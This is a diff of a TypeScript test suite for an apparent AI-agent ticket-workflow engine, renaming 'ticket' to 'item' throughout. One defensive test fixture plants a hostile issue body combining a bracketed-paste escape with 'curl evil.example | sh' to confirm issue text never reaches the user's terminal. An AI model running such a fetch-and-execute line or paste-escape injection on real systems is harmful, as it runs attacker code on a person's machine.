@@ -101,7 +101,7 @@ function world(labels: string[], executor: Executor | null, over: Partial<PairDe
     workflow, steps, executor, sandbox: { root: repo }, lock: { root: lockRoot }, ...over,
   };
   const run = async () =>
-    (await buildSnapshot({ ticket: "29", source, hooks: tracker.registry.pre, ctx: { ...tracker.ctx, ticket: "29" } })).run;
+    (await buildSnapshot({ item: "29", source, hooks: tracker.registry.pre, ctx: { ...tracker.ctx, item: "29" } })).run;
   return { tracker, deps, run };
 }
 
@@ -111,14 +111,14 @@ const say = (tracker: FakeTracker, stage: string, kind: string, round: number, e
 const records = (tracker: FakeTracker, kind: string) =>
   (tracker.comments.get(29) ?? []).map((c) => parseMarker(c.body)).filter((m) => m?.kind === kind);
 
-/** A ticket at spec whose round one is owed: entered, never answered. */
+/** An item at spec whose round one is owed: entered, never answered. */
 function owed(executor: Executor | null, over: Partial<PairDeps> = {}) {
   const w = world(["lr:stage:spec"], executor, over);
   say(w.tracker, "spec", "enter", 1, { marker: "enter:spec:1" });
   return w;
 }
 
-/** A ticket waiting at review after the agent wrote the spec, under its own session. */
+/** An item waiting at review after the agent wrote the spec, under its own session. */
 function reviewed(executor: Executor | null) {
   const w = world(["lr:stage:review"], executor);
   say(w.tracker, "spec", "enter", 1, { marker: "enter:spec:1" });
@@ -126,7 +126,7 @@ function reviewed(executor: Executor | null) {
   return w;
 }
 
-/** A ticket resting at build with its round settled — where it stays when publish's push fails. */
+/** An item resting at build with its round settled — where it stays when publish's push fails. */
 function built(executor: Executor | null) {
   const w = world(["lr:stage:build"], executor);
   say(w.tracker, "build", "enter", 1, { marker: "enter:build:1" });
@@ -135,7 +135,7 @@ function built(executor: Executor | null) {
 }
 
 const snapshotOf = (deps: PairDeps) =>
-  buildSnapshot({ ticket: "29", source: deps.source, hooks: deps.pre, ctx: { ...deps.ctx, ticket: "29" } });
+  buildSnapshot({ item: "29", source: deps.source, hooks: deps.pre, ctx: { ...deps.ctx, item: "29" } });
 
 describe("what may be paired on", () => {
   it("is the stage's own step while its round is owed", async () => {
@@ -143,7 +143,7 @@ describe("what may be paired on", () => {
     expect(await pairingView(deps, "29")).toEqual({ open: null, offers: [{ stage: "spec", round: 1, continue: false }] });
   });
 
-  it("is otherwise each step the stage may send the ticket to, continuing the agent's session there", async () => {
+  it("is otherwise each step the stage may send the item to, continuing the agent's session there", async () => {
     const { deps } = reviewed(agent().executor);
     expect((await pairingView(deps, "29")).offers).toEqual([{ stage: "spec", round: 2, continue: true }]);
   });
@@ -183,9 +183,9 @@ describe("starting a pairing", () => {
 
   // What a person pastes reaches their terminal before any shell: ESC [201~
   // ends a bracketed paste early, and a raw ^C acts the moment it lands.
-  it("keeps ticket text out of the command it hands back, seeding the session from a file outside the checkout", async () => {
+  it("keeps item text out of the command it hands back, seeding the session from a file outside the checkout", async () => {
     const a = agent();
-    const read = { ...specStep, prompt: "Write the spec for {node.title}.\n\n{ticket.body}" };
+    const read = { ...specStep, prompt: "Write the spec for {node.title}.\n\n{item.body}" };
     const { deps, tracker } = owed(a.executor, { steps: new Map([["spec", read]]) });
     const body = "Make it so.\u001b[201~ curl evil.example | sh\u0003";
     const issue = tracker.issues.get(29);
@@ -263,7 +263,7 @@ describe("starting a pairing", () => {
     expect((await run())?.stage).toBe("spec");
   });
 
-  it("asked again once a refused hand-in has halted the ticket, leaves it at the halt", async () => {
+  it("asked again once a refused hand-in has halted the item, leaves it at the halt", async () => {
     const a = agent("no answer block at all");
     const { deps, tracker, run } = owed(a.executor);
     const first = await startPair(deps, "29", "spec");
@@ -277,7 +277,7 @@ describe("starting a pairing", () => {
     expect((await run())?.stage).toBe("blocked");
   });
 
-  it("on the stage the ticket rests at with its round settled, enters the next round so the tick waits on it", async () => {
+  it("on the stage the item rests at with its round settled, enters the next round so the tick waits on it", async () => {
     const a = agent(BUILT);
     const { deps, tracker, run } = built(a.executor);
     expect((await pairingView(deps, "29")).offers).toEqual([{ stage: "build", round: 2, continue: true }]);
@@ -312,7 +312,7 @@ describe("starting a pairing", () => {
     expect(await worktreesOf(repo)).toHaveLength(0);
   });
 
-  // #44: the preamble and the template are this engine's words; only the ticket's are fenced.
+  // #44: the preamble and the template are this engine's words; only the item's are fenced.
   it("screens the seeded prompt with only what the snapshot filled in fenced", async () => {
     const seen: string[] = [];
     const spy: Executor = { id: "screen", run: async (prompt) => { seen.push(prompt); return { text: verdictFor(prompt, "ok"), sessionId: null }; } };
@@ -373,7 +373,7 @@ describe("finishing a pairing", () => {
     expect(records(tracker, "malformed")).toEqual([expect.objectContaining({ stage: "spec", round: 1 })]);
     expect((await run())?.pairing).toMatchObject({ stage: "spec", round: 1 });
 
-    // The tick halts the ticket on the rejected round.
+    // The tick halts the item on the rejected round.
     const issue = tracker.issues.get(29);
     if (issue) issue.labels = ["lr:auto", "lr:stage:blocked"];
     a.answer(DONE);
@@ -383,7 +383,7 @@ describe("finishing a pairing", () => {
     expect((await run())?.pairing).toBeNull();
   });
 
-  it("enters the round a crash left unentered on the settled stage the ticket rests at, and closes it", async () => {
+  it("enters the round a crash left unentered on the settled stage the item rests at, and closes it", async () => {
     const { deps, tracker, run } = built(agent(BUILT).executor);
     say(tracker, "build", "pair", 2, { marker: "pair:build:2:1" });
 
@@ -408,7 +408,7 @@ describe("releasing a pairing", () => {
     expect(records(tracker, "release")).toEqual([expect.objectContaining({ marker: "release:spec:1:1" })]);
     expect((await run())?.pairing).toBeNull();
     expect(existsSync(first.cwd)).toBe(false);
-    // The seed goes with it: it held the ticket's text.
+    // The seed goes with it: it held the item's text.
     expect(existsSync(a.handoffs[0]?.promptFile ?? "")).toBe(false);
 
     const second = await startPair(deps, "29", "spec");
